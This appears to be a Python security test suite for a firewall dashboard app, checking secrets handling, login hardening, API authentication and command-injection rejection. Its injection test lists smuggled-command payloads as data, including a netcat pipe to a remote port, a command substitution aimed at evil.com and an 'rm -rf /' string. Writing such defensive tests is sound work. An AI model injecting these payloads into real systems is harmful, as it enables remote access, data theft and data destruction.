"""
Comprehensive Phase 1 Security Verification Suite.
Tests:
1. Environment & Secrets Management (.env & settings.py)
2. Authentication Hardening (Reject bad passwords, no auto-creation)
3. Unauthenticated API Protection (401 Unauthorized for /api/*, redirect for /)
4. Command Injection Immunity (Rejection of invalid IPs, parameterized subprocess)
"""

import sys
import os

# Ensure project root is in sys.path
BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if BASE_DIR not in sys.path:
    sys.path.insert(0, BASE_DIR)

def test_1_environment_secrets():
    print("\n[+] TEST 1: Environment & Secrets Management")
    import config.settings as s
    
    # 1. Check SMTP password is not empty and matches expected length
    assert s.SMTP_PASSWORD, "SMTP_PASSWORD should be loaded"
    assert len(s.SMTP_PASSWORD) > 8, "SMTP_PASSWORD should not be empty"
    
    # 2. Check SECRET_KEY is loaded and cryptographically strong
    assert s.SECRET_KEY, "SECRET_KEY must be set"
    assert len(s.SECRET_KEY) >= 32, "SECRET_KEY must be at least 32 chars"
    
    # 3. Check gitignore contains secrets
    gitignore_path = os.path.join(BASE_DIR, ".gitignore")
    with open(gitignore_path, "r", encoding="utf-8") as f:
        gi = f.read()
    assert ".env" in gi, ".env must be in .gitignore"
    assert "ssh_host_key" in gi, "ssh_host_key must be in .gitignore"
    print("  -> PASS: Secrets loaded from .env, .gitignore protects sensitive assets.")

def test_2_auth_hardening():
    print("\n[+] TEST 2: Authentication Hardening")
    from api.app import create_app
    from database.database import SessionLocal
    from database.user_model import User
    
    app = create_app()
    client = app.test_client()

    # 1. Test bad password rejection on existing user
    resp = client.post("/login", data={"email": "shakthin21@gmail.com", "password": "WRONG_PASSWORD_12345!"}, follow_redirects=True)
    assert b"Invalid credentials" in resp.data, "Wrong password must be rejected with error message"

    # 2. Test nonexistent user rejection (must NOT auto-create)
    ghost_email = "ghost_attacker_test_999@test.com"
    resp_ghost = client.post("/login", data={"email": ghost_email, "password": "any_password"}, follow_redirects=True)
    assert b"Invalid credentials" in resp_ghost.data, "Ghost user must be rejected"

    # 3. Ensure ghost user was never created in the database
    db = SessionLocal()
    try:
        ghost = db.query(User).filter(User.email == ghost_email).first()
        assert ghost is None, "Ghost user MUST NOT be created in the database on login attempt"
    finally:
        db.close()

    print("  -> PASS: Wrong passwords rejected, ghost users not auto-created.")

def test_3_api_protection():
    print("\n[+] TEST 3: Unauthenticated API Protection")
    from api.app import create_app
    app = create_app()
    client = app.test_client()

    # 1. Unauthenticated root dashboard access -> redirect to login
    r_dash = client.get("/")
    assert r_dash.status_code == 302, f"Expected 302 redirect for unauth root, got {r_dash.status_code}"
    assert "/login" in r_dash.headers.get("Location", "")

    # 2. Unauthenticated API access -> 401 Unauthorized JSON
    r_stats = client.get("/api/stats")
    assert r_stats.status_code == 401, f"Expected 401 for /api/stats, got {r_stats.status_code}"
    json_data = r_stats.get_json()
    assert json_data.get("error") == "Unauthorized"
    assert "Authentication required" in json_data.get("message", "")

    r_events = client.get("/api/events")
    assert r_events.status_code == 401, f"Expected 401 for /api/events, got {r_events.status_code}"

    # 3. Sensitive modification action -> 401
    r_unblock = client.post("/api/firewall/unblock", json={"ip": "1.2.3.4"})
    assert r_unblock.status_code == 401, f"Expected 401 for unblock, got {r_unblock.status_code}"

    # 4. Report download -> 401
    r_pdf = client.get("/api/reports/pdf")
    assert r_pdf.status_code == 401, f"Expected 401 for report download, got {r_pdf.status_code}"
    print("  -> PASS: API endpoints require auth (401), dashboard redirects to login (302).")

def test_4_command_injection():
    print("\n[+] TEST 4: Command Injection Defense")
    from defense.firewall import validate_ip_address, block_ip

    # Malicious injection payloads
    payloads = [
        "1.2.3.4; calc.exe",
        "1.2.3.4 && whoami",
        "1.2.3.4 | nc 10.0.0.1 4444",
        "$(whoami).evil.com",
        "1.2.3.4`id`",
        "invalid..ip",
        "127.0.0.1/24; rm -rf /"
    ]

    for p in payloads:
        try:
            validate_ip_address(p)
            assert False, f"Payload should have raised ValueError: {p}"
        except ValueError:
            pass  # Correctly rejected
        success, msg = block_ip(p, reason="Test Injection Attempt")
        assert not success, f"Payload should be rejected: {p}"
        assert "Invalid IP" in msg or "Security error" in msg, f"Expected security error message: {msg}"

    # Valid IP must pass validation
    assert validate_ip_address("192.168.1.100")
    assert validate_ip_address("8.8.8.8")
    assert validate_ip_address("2001:db8::1")
    print("  -> PASS: All injection attempts sanitized and rejected.")

if __name__ == "__main__":
    try:
        test_1_environment_secrets()
        test_2_auth_hardening()
        test_3_api_protection()
        test_4_command_injection()
        print("\n==========================================")
        print("ALL 4 SECURITY AUDIT TESTS PASSED (100% OK)")
        print("==========================================\n")
    except Exception as e:
        print(f"\n[FAIL] Security test failed: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
